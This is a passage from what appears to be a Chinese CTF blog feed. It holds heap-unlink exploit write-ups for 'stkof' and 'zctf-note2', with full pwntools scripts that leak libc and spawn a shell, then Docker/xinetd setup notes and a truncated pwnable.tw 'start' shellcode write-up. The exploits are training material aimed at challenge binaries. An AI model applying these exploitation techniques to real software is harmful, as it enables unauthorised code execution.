class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]</span><br><span class="line">if args[&apos;DEBUG&apos;]:</span><br><span class="line">    context.log_level = &apos;debug&apos;</span><br><span class="line">context.binary = &quot;./stkof&quot;</span><br><span class="line">stkof = ELF(&apos;./stkof&apos;)</span><br><span class="line">if args[&apos;REMOTE&apos;]:</span><br><span class="line">    p = remote(&apos;127.0.0.1&apos;, 7777)</span><br><span class="line">else:</span><br><span class="line">    p = process(&quot;./stkof&quot;)</span><br><span class="line">log.info(&apos;PID: &apos; + str(proc.pidof(p)[0]))</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">head = 0x602140                              //ida可以直接看，全局分配在了bss段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def alloc(size):</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;OK\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx, size, content):</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(&apos;OK\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    # trigger to malloc buffer for io function</span><br><span class="line">    alloc(0x100)  # idx 1</span><br><span class="line"></span><br><span class="line">    alloc(0x30)  # idx 2</span><br><span class="line">    # small chunk size inorder to trigger unlink</span><br><span class="line">    alloc(0x80)  # idx 3</span><br><span class="line">    # a fake chunk at global[2]=head+16 who&apos;s size is 0x20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/6gx 0x602140</span><br><span class="line">0x602140:0x00000000000000000x000000000244d020</span><br><span class="line">0x602150:0x000000000244d5400x000000000244d580</span><br><span class="line">0x602160:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/100gx 0x000000000244d530</span><br><span class="line">0x244d530:0x00000000000000000x0000000000000041</span><br><span class="line">0x244d540:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d550:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d560:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d570:0x00000000000000000x0000000000000091</span><br><span class="line">0x244d580:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d590:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d5f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x244d600:0x00000000000000000x0000000000020a01</span><br><span class="line">0x244d610:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = p64(0)  #prev_size</span><br><span class="line">    payload += p64(0x20)  #size</span><br><span class="line">    payload += p64(head + 16 - 0x18)  #fd</span><br><span class="line">    payload += p64(head + 16 - 0x10)  #bk</span><br><span class="line">    payload += p64(0x20)  # next chunk&apos;s prev_size bypass the check</span><br><span class="line">    payload = payload.ljust(0x30, &apos;a&apos;)</span><br><span class="line">    # overwrite global[3]&apos;s chunk&apos;s prev_size</span><br><span class="line">    # make it believe that prev chunk is at global[2]</span><br><span class="line">    payload += p64(0x30)</span><br><span class="line">    # make it believe that prev chunk is free</span><br><span class="line">    payload += p64(0x90)</span><br><span class="line">    edit(2, len(payload), payload)</span><br><span class="line">    # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8</span><br><span class="line">    free(3)</span><br><span class="line">    p.recvuntil(&apos;OK\n&apos;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/6gx 0x602140</span><br><span class="line">0x602140:0x00000000000000000x000000000244d020</span><br><span class="line">0x602150:0x00000000006021380x0000000000000000</span><br><span class="line">0x602160:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got</span><br><span class="line">    payload = &apos;a&apos; * 8 + p64(stkof.got[&apos;free&apos;]) + p64(stkof.got[&apos;puts&apos;]) + p64(</span><br><span class="line">        stkof.got[&apos;atoi&apos;])</span><br><span class="line">    edit(2, len(payload), payload)</span><br><span class="line">    # edit free@got to puts@plt</span><br><span class="line">    payload = p64(stkof.plt[&apos;puts&apos;])</span><br><span class="line">    edit(0, len(payload), payload)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/6gx 0x602130</span><br><span class="line">0x602130:0x00000000000000000x6161616161616161</span><br><span class="line">0x602140:0x0000000000602018  //free0x0000000000602020  //puts</span><br><span class="line">0x602150:0x0000000000602088  //atoi0x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #free global[1] to leak puts addr</span><br><span class="line">    free(1)</span><br><span class="line">    puts_addr = p.recvuntil(&apos;\nOK\n&apos;, drop=True).ljust(8, &apos;\x00&apos;)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(&apos;puts addr: &apos; + hex(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">    binsh_addr = libc_base + next(libc.search(&apos;/bin/sh&apos;))</span><br><span class="line">    system_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">    log.success(&apos;libc base: &apos; + hex(libc_base))</span><br><span class="line">    log.success(&apos;/bin/sh addr: &apos; + hex(binsh_addr))</span><br><span class="line">    log.success(&apos;system addr: &apos; + hex(system_addr))</span><br><span class="line">    # modify atoi@got to system addr</span><br><span class="line">    payload = p64(system_addr)</span><br><span class="line">    edit(2, len(payload), payload)</span><br><span class="line">    p.send(p64(binsh_addr))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h1 id="zctf-note2"><a href="#zctf-note2" class="headerlink" title="zctf-note2"></a>zctf-note2</h1><p>其实和stkof差不太多</p><h2 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h2><ol><li>创建 //最多只能有三个note，同时note大小最大128</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int NewNote()</span><br><span class="line">&#123;</span><br><span class="line">  char *note; // ST08_8</span><br><span class="line">  unsigned int v2; // eax</span><br><span class="line">  unsigned int size; // [rsp+4h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  if ( (unsigned int)NoteNum &gt; 3 )</span><br><span class="line">    return puts(&quot;note lists are full&quot;);</span><br><span class="line">  puts(&quot;Input the length of the note content:(less than 128)&quot;);</span><br><span class="line">  size = inputNum();</span><br><span class="line">  if ( size &gt; 0x80 )</span><br><span class="line">    return puts(&quot;Too long&quot;);</span><br><span class="line">  note = (char *)malloc(size);</span><br><span class="line">  puts(&quot;Input the note content:&quot;);</span><br><span class="line">  ReadStr(note, size, 10);</span><br><span class="line">  RemovePercent(note);</span><br><span class="line">  ptr[NoteNum] = (__int64)note;</span><br><span class="line">  Len[NoteNum] = size;</span><br><span class="line">  v2 = NoteNum++;</span><br><span class="line">  return printf(&quot;note add success, the id is %d\n&quot;, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>修改  //两种方式，overwrite与append</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;do you want to overwrite or append?[1.overwrite/2.append]&quot;);</span><br><span class="line">        v4 = inputNum();</span><br><span class="line">        if ( v4 == 1 || v4 == 2 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( v4 == 1 )</span><br><span class="line">            dest = 0;</span><br><span class="line">          else</span><br><span class="line">            strcpy(&amp;dest, src);</span><br><span class="line">          v0 = (char *)malloc(0xA0uLL);</span><br><span class="line">          v8 = v0;</span><br><span class="line">          *(_QWORD *)v0 = &apos;oCweNehT&apos;;</span><br><span class="line">          *((_QWORD *)v0 + 1) = &apos;:stnetn&apos;;</span><br><span class="line">          printf(v8);</span><br><span class="line">          ReadStr(v8 + 15, 0x90LL, 10);</span><br><span class="line">          RemovePercent(v8 + 15);</span><br><span class="line">          v1 = v8;</span><br><span class="line">          v1[v6 - strlen(&amp;dest) + 14] = 0;</span><br><span class="line">          strncat(&amp;dest, v8 + 15, 0xFFFFFFFFFFFFFFFFLL);</span><br><span class="line">          strcpy(src, &amp;dest);</span><br><span class="line">          free(v8);</span><br><span class="line">          puts(&quot;Edit note success!&quot;);</span><br></pre></td></tr></table></figure><p>还有show的功能和delete的功能，这里就不展示了</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>相比于stkof显而易见的漏洞，这个因为edit的操作较为复杂，漏洞没有那么容易出来，但是如果出来便可以直接利用。<br>在malloc时，可以输入size为0，这样将自动分配最小单位即0x20大小的chunk，但是在readstr时允许输入size-1大小的数，也就是0xffffffff，这样便足以溢出去修改。<br>free之后再申请同样大小的chunk，便会将其列入第四个chunk但是位置仍然在之前chunk1的位置，通过之前size的漏洞修改chunk3的pre_size及size得到unlink的条件。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./note2&apos;)</span><br><span class="line">note2 = ELF(&apos;./note2&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def newnote(length, content):</span><br><span class="line">    sh.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;(less than 128)&apos;)</span><br><span class="line">    sh.sendline(str(length))</span><br><span class="line">    sh.recvuntil(&apos;content:&apos;)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shownote(id):</span><br><span class="line">    sh.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;note:&apos;)</span><br><span class="line">    sh.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def editnote(id, choice, s):</span><br><span class="line">    sh.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;note:&apos;)</span><br><span class="line">    sh.sendline(str(id))</span><br><span class="line">    sh.recvuntil(&apos;2.append]&apos;)</span><br><span class="line">    sh.sendline(str(choice))</span><br><span class="line">    sh.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def deletenote(id):</span><br><span class="line">    sh.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    sh.sendline(&apos;4&apos;)</span><br><span class="line">    sh.recvuntil(&apos;note:&apos;)</span><br><span class="line">    sh.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;name:&apos;)</span><br><span class="line">sh.sendline(&apos;siriuswhiter&apos;)</span><br><span class="line">sh.recvuntil(&apos;address:&apos;)</span><br><span class="line">sh.sendline(&apos;aaaaaaaaaaaaaaaaa&apos;)</span><br><span class="line"></span><br><span class="line"># chunk0: a fake chunk</span><br><span class="line">ptr = 0x0000000000602120</span><br><span class="line">fakefd = ptr - 0x18</span><br><span class="line">fakebk = ptr - 0x10</span><br><span class="line">content = &apos;a&apos; * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + &apos;b&apos; * 64 + p64(0x60)</span><br><span class="line">#content = p64(fakefd) + p64(fakebk)</span><br><span class="line">newnote(128, content)</span><br><span class="line"># chunk1: a zero size chunk produce overwrite</span><br><span class="line">newnote(0, &apos;a&apos; * 8)</span><br><span class="line"># chunk2: a chunk to be overwrited and freed</span><br><span class="line">newnote(0x80, &apos;b&apos; * 16)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"># edit the chunk1 to overwrite the chunk2</span><br><span class="line">deletenote(1)</span><br><span class="line">content = &apos;a&apos; * 16 + p64(0xa0) + p64(0x90)</span><br><span class="line">newnote(0, content)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"># delete note 2 to trigger the unlink</span><br><span class="line"># after unlink, ptr[0] = ptr - 0x18</span><br><span class="line">deletenote(2)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"># overwrite the chunk0(which is ptr[0]) with got atoi</span><br><span class="line">atoi_got = note2.got[&apos;atoi&apos;]</span><br><span class="line">content = &apos;a&apos; * 0x18 + p64(atoi_got)</span><br><span class="line">editnote(0, 1, content)</span><br><span class="line"># get the aoti addr</span><br><span class="line">shownote(0)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;is &apos;)</span><br><span class="line">atoi_addr = sh.recvuntil(&apos;\n&apos;, drop=True)</span><br><span class="line">print atoi_addr</span><br><span class="line">atoi_addr = u64(atoi_addr.ljust(8, &apos;\x00&apos;))</span><br><span class="line">print &apos;leak atoi addr: &apos; + hex(atoi_addr)</span><br><span class="line"></span><br><span class="line"># get system addr</span><br><span class="line">atoi_offest = libc.symbols[&apos;atoi&apos;]</span><br><span class="line">libcbase = atoi_addr - atoi_offest</span><br><span class="line">system_offest = libc.symbols[&apos;system&apos;]</span><br><span class="line">system_addr = libcbase + system_offest</span><br><span class="line"></span><br><span class="line">print &apos;leak system addr: &apos;, hex(system_addr)</span><br><span class="line"></span><br><span class="line"># overwrite the atoi got with systemaddr</span><br><span class="line">content = p64(system_addr)</span><br><span class="line">editnote(0, 1, content)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"># get shell</span><br><span class="line">sh.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Learning Docker</title>
      <link href="/2018/11/10/learning-docker/"/>
      <url>/2018/11/10/learning-docker/</url>
      <content type="html"><![CDATA[<p><em>之前是为了学习搭pwn题的环境稍微碰了下docker，但是因为kali上的gdb被我搞得问题很大，再加上不能完全卸载重装，索性想着搞一个pwn工具的集成环境，一劳永逸，docker无疑是个好东西，顺便也记录下搭建pwn题的过程吧</em></p><h1 id="pwn环境部署"><a href="#pwn环境部署" class="headerlink" title="pwn环境部署"></a>pwn环境部署</h1><p>  最基础的方法是socat， <code>socat tcp-l:9999,fork exec:./pwn1</code><br>  没有timeout，连得人多多半就爆炸了</p><p>所以选择：<br><code>xinted + docker</code></p><h2 id="xinted"><a href="#xinted" class="headerlink" title="xinted"></a>xinted</h2><p><a href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener">xinted</a>从权限到服务配置都做好了一个dockerfile,build即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Eadom/ctf_xinetd.git</span><br></pre></td></tr></table></figure><h2 id="docker-安装"><a href="#docker-安装" class="headerlink" title="docker 安装"></a>docker 安装</h2><p> 因为没有用ubuntu，kali等其他的debian系等等没法直接 <code>sudo apt-get install docker-ce</code></p><p>kali最后成功安装docker的方法：</p><p>在/etc/apt/sources.list 中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http://http.debian.net/debian jessie-backports main</span><br></pre></td></tr></table></figure><p>更新源并安装即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update   </span><br><span class="line">apt-get install docker.io</span><br></pre></td></tr></table></figure><h2 id="配置docker环境"><a href="#配置docker环境" class="headerlink" title="配置docker环境"></a>配置docker环境</h2><ul><li>将bin文件放置到bin目录下</li><li>修改flag内容</li><li>修改ctf.xinted的服务：<br>port = 指定端口<br>server_args = –userspec=1000:1000 /home/ctf ./binname</li></ul><h2 id="build-dockerfile"><a href="#build-dockerfile" class="headerlink" title="build dockerfile"></a>build dockerfile</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t &quot;binname&quot; . </span><br><span class="line">docker run -d -p &quot;0.0.0.0:9999:9999&quot; -h &quot;biname&quot; --name=&quot;binname&quot; binname</span><br></pre></td></tr></table></figure><p>将镜像跑起来就ok了</p><h1 id="pwn-docker"><a href="#pwn-docker" class="headerlink" title="pwn docker"></a>pwn docker</h1><p>一个集成pwn常用工具的docker，暂时用的是<a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">pwndocker</a>,不过比较臃肿，之后再自己搭建一个</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><em>一般刚开机docker未打开，使用<code>service docker start</code>打开服务</em></p><ol><li><code>pull</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull skysider/pwndocker</span><br></pre></td></tr></table></figure><ol start="2"><li><code>docker images</code> 可以看到已经在仓库里了</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/pwn/docker# docker images</span><br><span class="line">REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">skysider/pwndocker   latest              a24dde07a423        6 days ago          2.02GB</span><br></pre></td></tr></table></figure><p>各项含义：</p><pre><code>REPOSITORY：表示镜像的仓库源TAG：镜像的标签IMAGE ID：镜像IDCREATED：镜像创建时间SIZE：镜像大小</code></pre><ol start="3"><li><code>docker run -t -i skysider/pwndocker</code>直接进入bash</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/pwn/docker# docker run -t -i skysider/pwndocker</span><br><span class="line">root@b11ff1440061:/ctf/work#</span><br></pre></td></tr></table></figure><pre><code>*b11ff1440061 是container的id*</code></pre><ol start="4"><li>外部文件要往container里复制，使用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp /path/file b11ff1440061: /path</span><br></pre></td></tr></table></figure><p>当然b11ff1440061 换成container的id</p><ol start="5"><li>因为别人的docker工具不一定适合自己，需要自己再安装什么的，但是一般安装完退出后就又没有了，当然不能每次都重装</li></ol><p>有两种办法：</p><ul><li>在container中安装完以后，exit</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit  b11ff1440061 pwndocker</span><br></pre></td></tr></table></figure><p>同时可以使用</p><p>-m 来指定提交的说明信息，跟我们使用的版本控制一样<br>-a 可以指定更新的用户信息<br>之后是用来创建镜像容器的id 最后指定目标镜像仓库名和tag信息</p><p>这样可以将修改完的另存为新的image</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~# docker images</span><br><span class="line">REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">pwndocker            latest              7c0fa09ee004        12 seconds ago      2.05GB</span><br><span class="line">skysider/pwndocker   latest              a24dde07a423        6 days ago          2.02GB</span><br></pre></td></tr></table></figure><ul><li>使用dockerfile重新build</li></ul><p>像这里可以举例，编辑dockerfile：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM skysider/pwndocker</span><br><span class="line"></span><br><span class="line">RUN apt-get install vim</span><br></pre></td></tr></table></figure><p>From 指定镜像源<br>RUN 指令告诉docker 在镜像内执行命令，安装了什么。。<br>EXPOSE 可以指定开放端口</p><p>编辑完后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t pwndocker .</span><br></pre></td></tr></table></figure></p><p>按理说这样子就可以了。。但是我这里会有个报错<code>The command &#39;/bin/sh -c apt-get install vim&#39; returned a non-zero code: 1</code>仍未解决</p>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pwnable.tw-wp</title>
      <link href="/2018/11/06/pwnable-tw-wp/"/>
      <url>/2018/11/06/pwnable-tw-wp/</url>
      <content type="html"><![CDATA[<p><em>好久没碰pwn了，找找感觉</em><br><em>pwnable.tw网站的题都进不去，审查元素竟然没见到button响应？？于是就在源码里找题的文件源码保存下来，苟且做题</em></p><h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>见到的最轻巧的一个题</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">func main()</span><br><span class="line">push    esp</span><br><span class="line">; 4:   result = 3;</span><br><span class="line">push    offset _exit</span><br><span class="line">xor     eax, eax</span><br><span class="line">; 5:   __asm</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">xor     edx, edx</span><br><span class="line">push    &apos;:FTC&apos;</span><br><span class="line">push    &apos; eht&apos;</span><br><span class="line">push    &apos; tra&apos;</span><br><span class="line">push    &apos;ts s&apos;</span><br><span class="line">push    2774654Ch</span><br><span class="line">mov     ecx, esp        ; addr</span><br><span class="line">mov     dl, 14h         ; len</span><br><span class="line">mov     bl, 1           ; fd</span><br><span class="line">mov     al, 4</span><br><span class="line">int     80h             ; LINUX - sys_write</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     dl, 60</span><br><span class="line">mov     al, 3</span><br><span class="line">int     80h             ; LINUX -</span><br><span class="line">add     esp, 14h</span><br><span class="line">retn</span><br><span class="line"></span><br><span class="line">func exit()</span><br><span class="line">pop     esp</span><br><span class="line">xor     eax, eax</span><br><span class="line">inc     eax</span><br><span class="line">int     80h</span><br></pre></td></tr></table></figure><p>以上为所有的代码。。。 可以看出先使用系统调用write到屏幕，然后又调用read，调用完退出</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>大致推测应该要使用ret2shellcode,一共可以输入60长度的字符，20个就会溢出，所以想着将shellcode放在返回地址之后。<br>看了一下pwntools自带的shellcraft长度也有44。。。所以需要自己写或者在shellstorm上找一找符合要求的。<br>不知道栈地址，所以需要第一次将返回地址覆盖为之前的mov ecx,esp地址，write输出泄露输入的起始地址。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./start&apos;)</span><br><span class="line">sh = 